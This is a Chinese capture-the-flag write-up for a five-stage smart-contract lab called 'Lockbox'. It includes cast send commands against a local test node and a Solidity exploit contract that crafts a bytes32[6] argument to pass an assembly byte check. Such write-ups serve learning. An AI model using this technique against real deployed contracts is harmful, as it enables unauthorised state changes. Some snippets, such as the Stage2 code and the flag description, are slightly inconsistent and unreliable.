# Lockbox

## 题目描述

链式依赖型智能合约关卡，合约结构：1 个入口（Entrypoint）+ 5 个关卡（Stage1～5）  
必须严格按顺序解锁：Stage1 → Stage2 → Stage3 → Stage4 → Stage5  
Stage1～3：简单权限 / 状态锁  
Stage4：纯汇编硬编码校验（内存对齐、固定长度数组）  
Stage5：最终校验  
目标：全部通关 → 触发 Entrypoint 返回 Flag  

## 漏洞类型

链式依赖权限绕过（按顺序解锁即可）  
EVM 内存布局 / 数据对齐校验绕过  
汇编级硬编码密码校验绕过  
固定长度数组（bytes32 [6]）ABI 构造  
最终状态校验绕过  

## 漏洞原理

### 1. Stage1 原理
合约内有 `bool public unlocked1`，初始 `false`
`solve()` 把 `unlocked1 = true`
无任何校验
### 2. Stage2 原理
依赖：Stage1 必须已解锁
`solve()` 内部：
```solidity
require(Stage1(unlocked1).unlocked1());
unlocked2 = true;
```
通关
### 3. Stage3 原理
依赖：Stage2 必须已解锁
逻辑同 Stage2：
```solidity
require(Stage2(unlocked2).unlocked2());
unlocked3 = true;
```
### 4. Stage4 原理
函数：`solve(bytes32[6] calldata choices, uint256 pick)`
汇编逐字节校验：
`choices[pick]` 必须是 `"choose"`（右对齐）
数组长度必须严格为 `bytes32[6]`
正确下标：4
错误：`wrong choice!`
### 5. Stage5 原理
依赖：Stage1～4 全部解锁
逻辑：
```solidity
require(Stage1.unlocked1() && Stage2.unlocked2() && Stage3.unlocked3() && Stage4.unlocked4());
unlocked5 = true;
```

## 攻击原理
Stage1：直接调用 solve()  
Stage2：调用 `solve()`（Stage1 已解锁）  
Stage3：调用 `solve()`（Stage2 已解锁）  
Stage4：构造 正确内存布局的 bytes32 [6] 数组（choose 右对齐，下标 4）  
Stage5：调用 `solve()`（Stage1～4 全解锁）  
全部通过 → 从 Entrypoint 获取 Flag  

## 攻击步骤（Stage1～5 完整）
### 1. Stage1 通关
```bash
cast send <Stage1地址> "solve()" \
--rpc-url http://127.0.0.1:8545 \
--unlocked --from 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
```
### 2. Stage2 通关
```bash
cast send <Stage2地址> "solve()" \
--rpc-url http://127.0.0.1:8545 \
--unlocked --from 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
```
### 3. Stage3 通关
```bash
cast send <Stage3地址> "solve()" \
--rpc-url http://127.0.0.1:8545 \
--unlocked --from 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
```
### 4. Stage4 通关
编写攻击合约，构造 正确 bytes32 [6] 数组
部署合约， 自动调用 `Stage4.solve ()`
### 5. Stage5 通关
```bash
cast send <Stage5地址> "solve()" \
--rpc-url http://127.0.0.1:8545 \
--unlocked --from 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
```
### 6. 获取 Flag
调用 Entrypoint 合约的 flag() 或 solve()，返回 Flag

## 解题步骤
### 1. Stage1～3
用 cast send 调用 solve ()
### 2. Stage4
必须用合约构造数据（命令行手拼易报错）
攻击合约代码（无中文、可直接编译）：
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract LockboxExploit {
    constructor(address stage4) {
        bytes32[6] memory choices;
        // "choose" 右对齐（0x0000...63686f6f7365）
        choices[4] = hex"0000000000000000000000000000000000000000000000000063686f6f7365";

        (bool success, ) = stage4.call(
            abi.encodeWithSignature(
                "solve(bytes32[6],uint256)",
                choices,
                4
            )
        );
        require(success, "Stage4 failed");
    }
}
```
部署命令：
```bash
forge create LockboxExploit.sol:LockboxExploit \
--rpc-url http://127.0.0.1:8545 \
--unlocked \
--from 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 \
--constructor-args <Stage4地址> \
--broadcast
```
### 3. Stage5
调用 solve() → 检查所有前置关卡 → 解锁 Stage5
解锁后获取 Flag

## Lessons Learned

Stage4 难在格式、工具链、内存对齐
复杂 ABI 结构（固定长度数组）不要用命令行手拼  
汇编校验只认内存布局、字节对齐、下标，不认语义   
遇到底层题：优先看 长度、对齐、位置、下标  

### 关键理解

1. **链式依赖必须按顺序解锁**：Stage1 → Stage2 → Stage3 → Stage4 → Stage5 不能跳关，前置关卡未解锁会导致后续调用失败。

2. **Stage4 的难点在格式**：`bytes32[6]` 数组的 ABI 编码有固定长度（32字节 × 6 = 192字节），`"choose"` 字符串需要**右对齐**放在第 4 个槽位（下标从 0 开始）。命令行手动拼接极易出错，必须用合约构造。

3. **汇编级校验只认内存布局，不认语义**：Stage4 的汇编代码直接读取 calldata 中的字节，校验的是“这个位置上的字节是否等于某个值”，而不是理解“choose”这个单词。因此只要字节对齐正确，就能绕过。

4. **`isSolved()` 是最终裁判**：完成所有 Stage 后，`Entrypoint` 的 `solved` 状态变为 `true`，`Setup.isSolved()` 返回 `true` 即代表解题成功，不需要寻找静态 Flag 字符串。

5. **本地测试必须加 `--broadcast`**：`forge create` 默认只模拟（dry run），不加 `--broadcast` 交易不会上链，状态不会改变。

### 学到的知识点

| 知识点 | 说明 |
|--------|------|
| **链式调用** | 合约之间的顺序依赖关系，前置状态必须满足才能继续 |
| **EVM 内存布局** | `bytes32[6]` 是固定长度数组，ABI 编码时每个元素占 32 字节，连续排列 |
| **数据对齐** | 字符串 `"choose"` 在 `bytes32` 中必须右对齐（靠右填充），否则字节校验失败 |
| **ABI 编码** | 固定长度数组不需要长度前缀，直接按顺序编码元素 |
| **汇编级校验** | 底层校验不看语义，只看特定偏移量上的字节值 |
| **`cast send` 与 `forge create`** | 发送交易、部署合约的基础命令 |
| **`--unlocked` 参数** | 连接 anvil 时使用，直接使用已解锁账户，无需私钥 |
| **`--broadcast` 参数** | `forge create` 必须加此参数才能实际上链 |

## Flag
本题的 Flag 不是静态字符串，而是成功通关后 `Setup.isSolved()` 返回 `true` 的状态。
